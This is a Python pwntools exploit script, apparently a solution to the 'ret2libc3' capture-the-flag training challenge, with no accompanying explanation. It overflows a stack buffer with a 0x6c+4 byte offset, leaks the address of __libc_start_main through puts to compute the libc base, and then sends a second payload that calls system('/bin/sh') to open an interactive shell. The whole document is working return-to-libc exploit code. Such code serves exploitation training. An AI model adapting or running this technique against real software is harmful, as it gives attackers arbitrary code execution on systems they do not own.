from pwn import *

elf_ret2libc3 = ELF('./ret2libc3')
elf_libc = ELF('/lib/i386-linux-gnu/libc.so.6')

sh = process('./ret2libc3')

plt_puts = elf_ret2libc3.plt['puts']
got_libc_start_main = elf_ret2libc3.got['__libc_start_main']
addr_start = elf_ret2libc3.symbols['_start']

offset = 0x6c + 4

payload1 = flat([
    b'A' * offset,
    plt_puts,
    addr_start,
    got_libc_start_main
])

sh.sendlineafter(b'Can you find it !?', payload1)

leaked_data = sh.recvline().strip()
libc_start_main_addr = u32(leaked_data[:4])
print('libc_start_main_addr: ' + hex(libc_start_main_addr))

libc_base = libc_start_main_addr - elf_libc.symbols['__libc_start_main']
print('libc_base: ' + hex(libc_base))

system_addr = libc_base + elf_libc.symbols['system']
print('system_addr: ' + hex(system_addr))

addr_bin_sh = libc_base + next(elf_libc.search(b'/bin/sh'))
print('addr_bin_sh: ' + hex(addr_bin_sh))

payload2 = flat([
    b'A' * offset,
    system_addr,
    0xdeadbeef,
    addr_bin_sh
])

sh.sendline(payload2)
sh.interactive()
